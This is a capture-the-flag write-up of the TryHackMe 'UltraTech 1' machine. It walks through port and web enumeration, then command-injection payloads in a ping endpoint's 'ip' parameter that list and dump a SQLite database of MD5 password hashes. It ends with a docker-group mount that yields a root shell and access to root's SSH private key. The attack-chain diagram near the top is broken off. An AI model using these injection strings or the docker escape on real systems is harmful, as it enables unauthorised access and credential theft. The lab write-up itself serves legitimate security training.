## Overview

This write-up documents the methodology used to compromise the **UltraTech 1** TryHackMe machine, beginning with network enumeration and web content discovery, followed by command injection against a Node.js application, credential extraction from a SQLite database, SSH access, and privilege escalation through Docker group membership.

The attack chain can be summarized as:

```text

  ├── SSH : 22

## 1. Network Scanning

The first step was a full TCP port scan with default scripts and service/version detection.

```bash
nmap -sC -sV -p- 10.48.172.154
```

### Results

| Port      | Service | Version              |
| --------- | ------- | -------------------- |
| 21/tcp    | FTP     | vsftpd 3.0.5         |
| 22/tcp    | SSH     | OpenSSH 8.2p1 Ubuntu |
| 8081/tcp  | HTTP    | Node.js / Express    |
| 31331/tcp | HTTP    | Apache 2.4.41        |

The two HTTP services were particularly interesting because they exposed separate applications.

## 2. Web Enumeration

### Port 31331

The Apache application was enumerated first.

```bash
ffuf -u http://10.48.172.154:31331/FUZZ \
-w /opt/wordlists/SecLists-master/Discovery/Web-Content/common.txt
```

Interesting results included:

```text
/index.html
/robots.txt
/css/
/images/
/javascript/
/js/
```

The `robots.txt` file revealed an additional sitemap:

```text
/utech_sitemap.txt
```

Requesting the sitemap revealed:

```text
/
/index.html
/what.html
/partners.html
```

The `/partners.html` page later became relevant for authentication.

## 3. Enumeration of the Node.js Application

The second HTTP service on port `8081` was also fuzzed.

```bash
ffuf -u http://10.48.172.154:8081/FUZZ \
-w /opt/wordlists/SecLists-master/Discovery/Web-Content/common.txt
```

The important endpoints were:

```text
/auth
/ping
```

The `/ping` endpoint immediately stood out because it accepts an `ip` parameter and returned a server error when malformed input was supplied.

A normal request was:

```text
http://10.48.172.154:8081/ping?ip=127.0.0.1
```

This suggested that the backend was likely executing a system command such as `ping`.

---

## 4. Command Injection

The `ip` parameter was tested for command injection.

A basic injection attempt used shell command substitution:

```text
http://10.48.172.154:8081/ping?ip=127.0.0.1'|'`ls`
```

The response exposed the presence of a SQLite database:

```text
ping: utech.db.sqlite: Name or service not known
```

This confirmed that attacker-controlled input was reaching a shell command.

### Reading the SQLite Database

The same injection primitive could be used to read the database:

```text
http://10.48.172.154:8081/ping?ip=127.0.0.1'|'`cat utech.db.sqlite`
```

The response contained credential material from the database, including two MD5 hashes:

```text
Mr00tf357a0c52799563c7c7b76c1e7543a32
Madmin0d0ea5111e3c1def594c1684e3b9be84
```

The extracted hashes were then cracked.

## 6. SSH Access

The discovered credentials were tested against the SSH service.

```bash
ssh r00t@10.48.172.154
```

After obtaining a shell, the first privilege-escalation checks were performed.

```bash
id
```

The result showed:

```text
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
```

The user was **not** a member of the `sudo` group, so conventional sudo-based privilege escalation was unavailable.

However, membership in the `docker` group was significant.

---

## 7. Privilege Escalation via Docker

A user with access to the Docker daemon can potentially mount the host filesystem into a container and access it with elevated privileges.

The first attempt used Alpine:

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
```

This failed because the machine could not download the image from Docker Hub:

```text
Client.Timeout exceeded while awaiting headers
```

Since network access to the registry was unavailable, another locally available image was attempted:

```bash
docker run -v /:/mnt --rm -it bash chroot /mnt /bin/sh
```

This succeeded.

The resulting shell had root privileges:

```bash
# whoami
root
```

This demonstrates why membership in the `docker` group should be treated as a high-impact privilege-escalation vector.

---

## 8. Root-Level File Enumeration

With the host filesystem mounted inside the container, the root user's home directory could be accessed.

```bash
ls
```

An interesting file was found:

```text
private.txt
```

Its contents were:

```text
# Life and acomplishments of Alvaro Squalo - Tome I

Memoirs of the most successful digital nomdad finblocktech entrepreneur
in the world.

By himself.

## Chapter 1 - How I became successful
```

The root SSH directory was also accessible:

```bash
cd .ssh
ls
```

This revealed:

```text
authorized_keys
id_rsa
id_rsa.pub
```

The private SSH key was then recovered from:

```bash
cat id_rsa
```

The key was in standard RSA private-key format:

```text
-----BEGIN RSA PRIVATE KEY-----
...
-----END RSA PRIVATE KEY-----
```

This provides another route to authenticated SSH access as the privileged user, assuming the corresponding account and SSH configuration permit key-based authentication.

## Key Takeaways

* **Enumerate every exposed service.** The machine exposed multiple web applications on different ports.
* **Always inspect `robots.txt`.** It disclosed the `utech_sitemap.txt` file and helped map the Apache application.
* **Test application parameters for command injection** when functionality appears to invoke system utilities.
* **Look for local databases and configuration files** after obtaining command execution.
* **Never overlook group memberships.** `docker` membership can effectively provide root-level access to the host.
* **Check alternative privilege-escalation paths** when `sudo` is unavailable.
* **Container images may be locally available even when outbound access to Docker Hub is blocked.**
* **Sensitive SSH material should never be unnecessarily exposed or readable by unintended users.**
